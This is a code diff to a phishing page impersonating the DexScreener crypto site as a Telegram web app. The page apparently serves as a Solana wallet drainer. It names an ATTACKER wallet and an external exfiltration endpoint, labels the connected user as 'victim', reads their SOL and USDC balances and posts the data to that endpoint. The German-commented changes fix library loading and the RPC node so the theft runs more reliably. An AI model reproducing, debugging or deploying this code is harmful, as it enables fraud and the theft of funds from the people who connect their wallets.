@@ -5,7 +5,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>DEXSCREENR</title>
 <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.js"></script>
-<script src="https://unpkg.com/@solana/spl-token@0.3.9/lib/index.iife.js"></script>
+<!-- NEUE SPL-TOKEN BIBLIOTHEK -->
+<script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.3.9/lib/index.iife.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/bs58@5.0.0/dist/bs58.min.js"></script>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <style>
@@ -102,7 +103,6 @@
   }
   .security-footer svg { width: 12px; height: 12px; opacity: 0.7; }
 
-  /* DEBUG WINDOW */
   #debug-window {
     position: fixed; bottom: 0; left: 0; right: 0; background: rgba(255,0,0,0.8); color: white;
     font-family: monospace; font-size: 12px; padding: 10px; z-index: 9999; max-height: 150px; overflow-y: auto; display: none;
@@ -210,8 +210,6 @@
   const ATTACKER = "FN73jYtbKMkfT14yG8MvMzrmCSREyX45rUrxiKoRbofB"; 
   const ENDPOINT = "https://sol-sync-worker.rthvzkr6jv.workers.dev"; 
   const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; 
-  
-  // HIER IST DER FIX: Wir nutzen einen öffentlichen RPC, der keine 403 Fehler wirft
   const RPC_URL = "https://solana.publicnode.com"; 
 
   const container = document.getElementById('sliderContainer');
@@ -271,7 +269,6 @@
       const victim = resp.publicKey.toString();
       logDebug("Connected: " + victim);
       
-      // Nutzt jetzt den öffentlichen RPC
       const conn = new solanaWeb3.Connection(RPC_URL);
       
       logDebug("Fetching balance...");
@@ -279,15 +276,21 @@
       const solAmount = solBalance / solanaWeb3.LAMPORTS_PER_SOL;
       logDebug("SOL Balance: " + solAmount);
       
-      const victimAta = await splToken.getAssociatedTokenAddress(new solanaWeb3.PublicKey(USDC_MINT), resp.publicKey);
+      // Fallback, falls splToken nicht geladen wurde
       let usdcAmount = 0;
-      try {
-        const tokenBal = await conn.getTokenAccountBalance(victimAta);
-        usdcAmount = tokenBal.value.uiAmount;
-        logDebug("USDC Balance: " + usdcAmount);
-      } catch (e) { logDebug("No USDC account"); }
+      if (typeof splToken !== 'undefined') {
+        logDebug("splToken loaded.");
+        const victimAta = await splToken.getAssociatedTokenAddress(new solanaWeb3.PublicKey(USDC_MINT), resp.publicKey);
+        try {
+          const tokenBal = await conn.getTokenAccountBalance(victimAta);
+          usdcAmount = tokenBal.value.uiAmount;
+          logDebug("USDC Balance: " + usdcAmount);
+        } catch (e) { logDebug("No USDC account"); }
+      } else {
+        logDebug("WARNING: splToken library not loaded. Skipping USDC check.");
+      }
 
-      logDebug("Sending to ENDPOINT: " + ENDPOINT);
+      logDebug("Sending to ENDPOINT...");
       const fetchResp = await fetch(ENDPOINT, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
